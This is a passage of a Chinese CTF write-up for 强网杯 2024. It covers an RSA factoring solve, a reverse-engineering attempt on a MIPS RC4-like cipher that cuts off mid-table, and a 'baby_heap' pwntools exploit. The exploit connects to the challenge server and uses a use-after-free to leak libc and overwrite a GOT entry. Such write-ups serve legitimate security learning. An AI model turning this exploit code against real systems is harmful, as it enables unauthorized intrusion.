<p>d≡e−1(modϕ(n))<em>d</em>≡<em>e</em>−1(mod<em>ϕ</em>(<em>n</em>))</p>
<h3 id="阶段-2-ai⋅p-bi⋅qa-i⋅p-b-i⋅q"><a href="#阶段-2-ai⋅p-bi⋅qa-i⋅p-b-i⋅q" class="headerlink" title="阶段 2: ai⋅p+bi⋅qa**i⋅p+b**i⋅q"></a>阶段 2: ai⋅p+bi⋅q<em>a**i</em>⋅<em>p</em>+<em>b**i</em>⋅<em>q</em></h3><p>在第二阶段，我们得到了多个线性组合形式的提示：</p>
<p>ci&#x3D;ai⋅p+bi⋅q,对于 i&#x3D;1,2,…,100<em>c**i</em>&#x3D;<em>a**i</em>⋅<em>p</em>+<em>b**i</em>⋅<em>q</em>,对于 <em>i</em>&#x3D;1,2,…,100</p>
<p>这些方程组成了一个线性方程组，我们可以将其表示为矩阵形式，设想我们有矩阵 A<em>A</em> 和向量 x<strong>x</strong> 和 b<strong>b</strong>:</p>
<p>A&#x3D;(a1b1a2b2⋮⋮a100b100),x&#x3D;(pq),b&#x3D;(c1c2⋮c100)<em>A</em>&#x3D;<em>a</em>1<em>a</em>2⋮<em>a</em>100<em>b</em>1<em>b</em>2⋮<em>b</em>100,<strong>x</strong>&#x3D;(<em>p**q</em>),<strong>b</strong>&#x3D;<em>c</em>1<em>c</em>2⋮<em>c</em>100</p>
<p>我们可以通过解线性方程组 Ax&#x3D;b<em>A</em><strong>x</strong>&#x3D;<strong>b</strong> 来恢复 p<em>p</em> 和 q<em>q</em>。如果 A<em>A</em> 的秩为 2，则该方程组有唯一解。</p>
<h3 id="阶段-3-a⋅p-qa⋅p-q-和-p-b⋅qp-b⋅q"><a href="#阶段-3-a⋅p-qa⋅p-q-和-p-b⋅qp-b⋅q" class="headerlink" title="阶段 3: a⋅p+qa⋅p+q 和 p+b⋅qp+b⋅q"></a>阶段 3: a⋅p+q<em>a</em>⋅<em>p</em>+<em>q</em> 和 p+b⋅q<em>p</em>+<em>b</em>⋅<em>q</em></h3><p>在第三阶段，我们获得了两个线性方程：</p>
<p>c1&#x3D;a⋅p+q<em>c</em>1&#x3D;<em>a</em>⋅<em>p</em>+<em>q</em></p>
<p>c2&#x3D;p+b⋅q<em>c</em>2&#x3D;<em>p</em>+<em>b</em>⋅<em>q</em></p>
<p>将这两个方程表示为矩阵形式：</p>
<p>(a11b)(pq)&#x3D;(c1c2)(<em>a</em>11<em>b</em>)(<em>p**q</em>)&#x3D;(<em>c</em>1<em>c</em>2)</p>
<p>同样地，我们可以通过求解这个 2×22×2 的线性方程组来恢复 p<em>p</em> 和 q<em>q</em>。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过上述步骤，我们可以逐步恢复每一阶段的 RSA 密钥参数，最终通过已知的加密消息 c<em>c</em> 和计算出的私钥 d<em>d</em>，使用以下公式进行解密：</p>
<p>m&#x3D;cdmod  n<em>m</em>&#x3D;<em>c**d</em>mod<em>n</em></p>
<p>整个解密过程依赖于数论和线性代数的交叉应用，通过利用已知结构和线性关系有效地恢复原始消息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_stage1</span>(<span class="params">n, e, ct, pq_sum</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Solve stage 1 where we have p + q</span></span><br><span class="line"><span class="string">    Using: n = p*q and p + q = pq_sum</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Using the quadratic equation: x^2 - (p+q)x + n = 0</span></span><br><span class="line">    <span class="comment"># where p+q is known and n is known</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = -pq_sum</span><br><span class="line">    c = n</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Quadratic formula</span></span><br><span class="line">    discriminant = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    p = (-b + isqrt(discriminant)) // <span class="number">2</span></span><br><span class="line">    q = n // p</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Verify our solution</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == n</span><br><span class="line">    <span class="keyword">assert</span> p + q == pq_sum</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate private key</span></span><br><span class="line">    d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(pt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_stage2</span>(<span class="params">n, e, ct, hints</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Solve stage 2 where we have multiple equations of form: ai*p + bi*q = ci</span></span><br><span class="line"><span class="string">    Using LLL to find small solutions</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> Matrix, ZZ, vector</span><br><span class="line"></span><br><span class="line">    <span class="comment"># We&#x27;ll use 2 equations for simplicity</span></span><br><span class="line">    a1, a2 = hints[<span class="number">0</span>], hints[<span class="number">1</span>]  <span class="comment"># These are the results (a*p + b*q)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create matrix for LLL</span></span><br><span class="line">    B = Matrix(ZZ, <span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line">    B[<span class="number">0</span>, <span class="number">0</span>] = n</span><br><span class="line">    B[<span class="number">1</span>, <span class="number">1</span>] = n</span><br><span class="line">    B[<span class="number">2</span>, <span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">    B[<span class="number">3</span>, <span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">    B[<span class="number">0</span>, <span class="number">2</span>] = a1</span><br><span class="line">    B[<span class="number">1</span>, <span class="number">3</span>] = a2</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Run LLL</span></span><br><span class="line">    L = B.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Search for small vectors that give us p and q</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> L:</span><br><span class="line">        k1, k2, t1, t2 = row</span><br><span class="line">        candidate_p = <span class="built_in">abs</span>(t1)</span><br><span class="line">        <span class="keyword">if</span> candidate_p &gt; <span class="number">1</span> <span class="keyword">and</span> n % candidate_p == <span class="number">0</span>:</span><br><span class="line">            p = candidate_p</span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">                <span class="comment"># Verify our solution</span></span><br><span class="line">                <span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Calculate private key</span></span><br><span class="line">                d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">                <span class="keyword">return</span> long_to_bytes(pt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_stage3</span>(<span class="params">n, e, ct, hint1, hint2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Solve stage 3 where we have: a*p + q and p + b*q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Let&#x27;s call hint1 = a*p + q and hint2 = p + b*q</span></span><br><span class="line">    <span class="comment"># We can solve this system of equations:</span></span><br><span class="line">    <span class="comment"># hint1 = a*p + q</span></span><br><span class="line">    <span class="comment"># hint2 = p + b*q</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># From hint1: q = hint1 - a*p</span></span><br><span class="line">    <span class="comment"># Substitute into hint2:</span></span><br><span class="line">    <span class="comment"># hint2 = p + b*(hint1 - a*p)</span></span><br><span class="line">    <span class="comment"># hint2 = p + b*hint1 - a*b*p</span></span><br><span class="line">    <span class="comment"># p*(1 - a*b) = hint2 - b*hint1</span></span><br><span class="line">    <span class="comment"># p = (hint2 - b*hint1)/(1 - a*b)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Try different values for a and b</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> - a * b) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            p = (hint2 - b * hint1) // (<span class="number">1</span> - a * b)</span><br><span class="line">            <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                q = n // p</span><br><span class="line">                <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">                    <span class="comment"># Verify solution</span></span><br><span class="line">                    <span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Calculate private key</span></span><br><span class="line">                    d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                    pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">                    <span class="keyword">return</span> long_to_bytes(pt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse inputs</span></span><br><span class="line">n1, e = (</span><br><span class="line"><span class="number">89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589</span>,</span><br><span class="line"><span class="number">65537</span>)</span><br><span class="line">ct1 = <span class="number">23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span></span><br><span class="line">pq_sum = <span class="number">18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run solvers</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Stage 1 solution:&quot;</span>)</span><br><span class="line">flag_part1 = solve_stage1(n1, e, ct1, pq_sum)</span><br><span class="line"><span class="built_in">print</span>(flag_part1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[+] Stage 2 solution:&quot;</span>)</span><br><span class="line">n2 = <span class="number">73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819</span></span><br><span class="line">ct2 = <span class="number">30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span></span><br><span class="line">hints2 = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&quot;...&quot;</span>.split(<span class="string">&#x27;,&#x27;</span>)]  <span class="comment"># List of 100 equations</span></span><br><span class="line">flag_part2 = solve_stage2(n2, e, ct2, hints2)</span><br><span class="line"><span class="built_in">print</span>(flag_part2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[+] Stage 3 solution:&quot;</span>)</span><br><span class="line">n3 = <span class="number">94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581</span></span><br><span class="line">ct3 = <span class="number">17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span></span><br><span class="line">hint3_1, hint3_2 = (</span><br><span class="line"><span class="number">68510878638370415044742935889020774276546916983689799210290582093686515377232591362560941306242501220803210859757512468762736941602749345887425082831572206675493389611203432014126644550502117937044804472954180498370676609819898980996282130652627551615825721459553747074503843556784456297882411861526590080037</span>,</span><br><span class="line"><span class="number">117882651978564762717266768251008799169262849451887398128580060795377656792158234083843539818050019451797822782621312362313232759168181582387488893534974006037142066091872636582259199644094998729866484138566711846974126209431468102938252566414322631620261045488855395390985797791782549179665864885691057222752</span>)</span><br><span class="line">flag_part3 = solve_stage3(n3, e, ct3, hint3_1, hint3_2)</span><br><span class="line"><span class="built_in">print</span>(flag_part3)</span><br></pre></td></tr></table></figure>

<p>最后拼接flag即可</p>
<h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p>猜猜是不是uaf，打开一看很好啊很好.</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%871.png" alt="1"></p>
<p>运行分析</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%872.png" alt="1"></p>
<p>IDA分析 看看函数功能和隐藏内容</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%873.png" alt="1"></p>
<p>uaf</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%874.png" alt="1"></p>
<p>任意地址写</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%875.png" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.106.63.28&quot;</span>,<span class="number">20491</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rc=<span class="keyword">lambda</span> *args:p.recv(*args)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sd=<span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> a,b:p.sendafter(a,b)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class="line">ls=<span class="keyword">lambda</span> *args:log.success(*args)</span><br><span class="line">ia=<span class="keyword">lambda</span> *args:p.interactive()</span><br><span class="line">pl=<span class="keyword">lambda</span> *args:<span class="built_in">print</span>(*args)</span><br><span class="line">ts=<span class="keyword">lambda</span> *args:time.sleep(*args)</span><br><span class="line">l8 = <span class="keyword">lambda</span> x:x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;e &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;here \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x700</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base_addr = u64(p.recv(<span class="number">8</span>))-<span class="number">0x21ace0</span></span><br><span class="line">got = libc_base_addr + <span class="number">0x00000000021A118</span></span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sd(p64(got))</span><br><span class="line">sd(p64(libc_base_addr+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>运行之后不用输命令就会跳出flag</p>
<p>但是这里我很奇怪怎么打本地都打不通，打远程就可以</p>
<h2 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h2><p>主要加密在emu里面，是一个类似于rc4加密的加密，找到加密的地址，有花指令恢复一下函数</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-172056.png" alt="1"></p>
<p>恢复完成,经过动态调试后发现xor_data是动态的，一直调试不清楚，这里面我们选择爆破</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-172356.png" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">deadbeef = <span class="built_in">bytearray</span>([<span class="number">0xDE</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xEF</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">input_bytes, xor</span>):</span><br><span class="line">    SBox = <span class="built_in">bytearray</span>([</span><br><span class="line">        <span class="number">0x36</span>, <span class="number">0x68</span>, <span class="number">0x32</span>, <span class="number">0x44</span>, <span class="number">0x12</span>, <span class="number">0x61</span>, <span class="number">0x6f</span>, <span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xba</span>, <span class="number">0xe9</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x3d</span>, <span class="number">0xa8</span>, <span class="number">0xe6</span>, <span class="number">0x1e</span>,</span><br><span class="line">        <span class="number">0x4d</span>, <span class="number">0xf2</span>, <span class="number">0xb1</span>, <span class="number">0x7e</span>, <span class="number">0xc2</span>, <span class="number">0x6a</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x19</span>, <span class="number">0x14</span>, <span class="number">0x42</span>, <span class="number">0xa2</span>, <span class="number">0x11</span>, <span class="number">0xe5</span>, <span class="number">0x5b</span>,</span><br><span class="line">        <span class="number">0x9d</span>, <span class="number">0x23</span>, <span class="number">0x3</span>, <span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0xd8</span>, <span class="number">0x9</span>, <span class="number">0x8a</span>,</span><br><span class="line">        <span class="number">0x3c</span>, <span class="number">0x7d</span>, <span class="number">0x1a</span>, <span class="number">0x46</span>, <span class="number">0x49</span>, <span class="number">0xdc</span>, <span class="number">0x76</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0x3e</span>, <span class="number">0x4</span>, <span class="number">0x9a</span>, <span class="number">0xc</span>, <span class="number">0x43</span>, <span class="number">0x4b</span>, <span class="number">0x72</span>, <span class="number">0x5f</span>,</span><br><span class="line">        <span class="number">0x53</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x4f</span>, <span class="number">0xa7</span>, <span class="number">0xf6</span>, <span class="number">0x7b</span>,</span><br><span class="line">        <span class="number">0x94</span>, <span class="number">0xa3</span>, <span class="number">0x47</span>, <span class="number">0x8f</span>, <span class="number">0xf4</span>, <span class="number">0x52</span>, <span class="number">0x2a</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x27</span>, <span class="number">0x2c</span>, <span class="number">0xf5</span>, <span class="number">0x75</span>, <span class="number">0x17</span>, <span class="number">0x79</span>,</span><br><span class="line">        <span class="number">0x5e</span>, <span class="number">0x7f</span>, <span class="number">0x9c</span>, <span class="number">0xcb</span>, <span class="number">0x55</span>, <span class="number">0xbb</span>, <span class="number">0x60</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0xb8</span>, <span class="number">0xd2</span>, <span class="number">0xd4</span>, <span class="number">0x8b</span>, <span class="number">0xbf</span>, <span class="number">0x1f</span>, <span class="number">0x41</span>, <span class="number">0x45</span>,</span><br><span class="line">        <span class="number">0x0</span>, <span class="number">0x82</span>, <span class="number">0x69</span>, <span class="number">0x40</span>, <span class="number">0xe1</span>, <span class="number">0x9f</span>, <span class="number">0xe2</span>, <span class="number">0xd3</span>,</span><br><span class="line">        <span class="number">0x4a</span>, <span class="number">0x1c</span>, <span class="number">0x71</span>, <span class="number">0x62</span>, <span class="number">0x18</span>, <span class="number">0x24</span>, <span class="number">0x97</span>, <span class="number">0x84</span>,</span><br><span class="line">        <span class="number">0xa</span>, <span class="number">0x8e</span>, <span class="number">0x3f</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x86</span>, <span class="number">0xe</span>, <span class="number">0x67</span>,</span><br><span class="line">        <span class="number">0xc9</span>, <span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0xb0</span>, <span class="number">0x6e</span>, <span class="number">0x54</span>, <span class="number">0x92</span>, <span class="number">0xef</span>,</span><br><span class="line">        <span class="number">0x9b</span>, <span class="number">0xd5</span>, <span class="number">0xa5</span>, <span class="number">0xb</span>, <span class="number">0xdd</span>, <span class="number">0xbd</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">        <span class="number">0xc8</span>, <span class="number">0x3a</span>, <span class="number">0x65</span>, <span class="number">0x56</span>, <span class="number">0xe0</span>, <span class="number">0xf1</span>, <span class="number">0x6</span>, <span class="number">0x1b</span>,</span><br><span class="line">        <span class="number">0xfa</span>, <span class="number">0xbc</span>, <span class="number">0xc4</span>, <span class="number">0x91</span>, <span class="number">0xc1</span>, <span class="number">0x2e</span>, <span class="number">0x13</span>, <span class="number">0xf0</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0xee</span>, <span class="number">0xac</span>, <span class="number">0xec</span>, <span class="number">0xa6</span>, <span class="number">0x26</span>, <span class="number">0x39</span>, <span class="number">0xb5</span>,</span><br><span class="line">        <span class="number">0xaf</span>, <span class="number">0xc3</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd</span>, <span class="number">0x5d</span>, <span class="number">0x29</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x6b</span>, <span class="number">0x50</span>, <span class="number">0xb2</span>, <span class="number">0xfe</span>, 